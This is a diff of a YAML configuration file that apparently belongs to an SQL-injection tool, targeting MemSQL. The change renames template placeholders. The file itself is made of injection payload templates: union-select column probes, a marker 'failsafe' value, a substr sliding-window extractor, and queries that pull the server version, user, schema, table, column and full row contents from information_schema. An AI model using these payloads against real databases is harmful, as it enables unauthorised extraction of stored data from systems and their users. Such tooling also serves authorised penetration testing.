@@ -3,12 +3,12 @@ resource:
  info: |
   concat(
       concat_ws(
-          '${ENCLOSE_VALUE_SQL}',
+          '${enclose_value_sql}',
           version(),
           database(),
           user()
       ),
-      '${TRAIL_SQL}'
+      '${trail_sql}'
   )
   
  schema: 
@@ -16,16 +16,16 @@ resource:
    select concat(
        ifnull(
            group_concat(
-               '${ENCLOSE_VALUE_SQL}',
+               '${enclose_value_sql}',
                r,
-               '${SEPARATOR_QTE_SQL}',
+               '${separator_qte_sql}',
                q,
-               '${ENCLOSE_VALUE_SQL}'
-               separator '${SEPARATOR_CELL_SQL}'
+               '${enclose_value_sql}'
+               separator '${separator_cell_sql}'
            ),
-           '${TRAIL_SQL}'
+           '${trail_sql}'
        ),
-       '${TRAIL_SQL}'
+       '${trail_sql}'
    ) from (
        select
            cast(SCHEMA_NAME as char) r,
@@ -34,101 +34,101 @@ resource:
        right join INFORMATION_SCHEMA.schemata s
        on s.SCHEMA_NAME = t.table_schema
        group by r
-       {limit}
+       ${limit}
    ) x
    
   table: |
    select concat(
        group_concat(
-           '${ENCLOSE_VALUE_SQL}',
+           '${enclose_value_sql}',
            r,
-           '${SEPARATOR_QTE_SQL}',
+           '${separator_qte_sql}',
            q,
-           '${ENCLOSE_VALUE_SQL}'
-           separator '${SEPARATOR_CELL_SQL}'
+           '${enclose_value_sql}'
+           separator '${separator_cell_sql}'
        ),
-       '${TRAIL_SQL}'
+       '${trail_sql}'
    ) from (
        select
            cast(TABLE_NAME as char) r,
            cast(ifnull(table_rows, '0') as char) q
        from information_schema.tables
-       where TABLE_SCHEMA = '${DATABASE}'
+       where TABLE_SCHEMA = '${database}'
        order by r
-       {limit}
+       ${limit}
    ) x
    
   column: |
    select concat(
        group_concat(
-           '${ENCLOSE_VALUE_SQL}',
+           '${enclose_value_sql}',
            n,
-           '${SEPARATOR_QTE_SQL}',
+           '${separator_qte_sql}',
            0,
-           '${ENCLOSE_VALUE_SQL}'
-           separator '${SEPARATOR_CELL_SQL}'
+           '${enclose_value_sql}'
+           separator '${separator_cell_sql}'
        ),
-       '${TRAIL_SQL}'
+       '${trail_sql}'
    ) from (
        select cast(COLUMN_NAME as char) n
        from information_schema.columns
-       where TABLE_SCHEMA = '${DATABASE}'
-       and TABLE_NAME = '${TABLE}'
+       where TABLE_SCHEMA = '${database}'
+       and TABLE_NAME = '${table}'
        order by n
-       {limit}
+       ${limit}
    ) x
    
   row: 
    query: |
     select concat(
         group_concat(
-            '${ENCLOSE_VALUE_SQL}',
+            '${enclose_value_sql}',
             r,
-            '${SEPARATOR_QTE_SQL}',
+            '${separator_qte_sql}',
             q,
-            '${ENCLOSE_VALUE_SQL}'
-            separator '${SEPARATOR_CELL_SQL}'
+            '${enclose_value_sql}'
+            separator '${separator_cell_sql}'
         ),
-        '${TRAIL_SQL}'
+        '${trail_sql}'
     ) from (
         select
-            cast(concat(${FIELDS}) as char) r,
+            cast(concat(${fields}) as char) r,
             cast(count(*) as char) q
-        from `${DATABASE}`.`${TABLE}`
+        from `${database}`.`${table}`
         group by r
-        {limit}
+        ${limit}
     ) x
    fields: 
-    field: trim(ifnull(`${FIELD}`, ''))
+    field: trim(ifnull(`${field}`, ''))
     concat: ",0x7f,"
     
 strategy: 
  configuration: 
   slidingWindow: |
    concat(
-       '${LEAD}',
+       '${lead}',
        substr(
-           (${INJECTION}),
-           ${INDEX},
-           ${CAPACITY}
+           (${injection}),
+           ${index},
+           ${capacity}
        )
    )
-  limit: limit ${LIMIT}, 65536
-  failsafe: 1337${INDICE}7330%2b1
-  calibrator: rpad('${CALIBRATOR_SQL}',1024,'${CALIBRATOR_SQL}')
+  limit: limit ${limit.value}, 65536
+  failsafe: 1337${indice}7330%2b1
+  calibrator: rpad('${calibrator_sql}',1024,'${calibrator_sql}')
   limitBoundary: 0
   fingerprint: 
    errorMessage: 
     - memsql
     
  normal: 
-  indices: union select ${INDICES}
+  indices: union select ${indices}
   capacity: |
    (
        select concat(
-           '${LEAD}', 
-           ${INDICE}, 
-           ${CALIBRATOR}
+           '${lead}', 
+           ${indice}, 
+           ${calibrator}
        )
    )
   orderBy: order by 1337
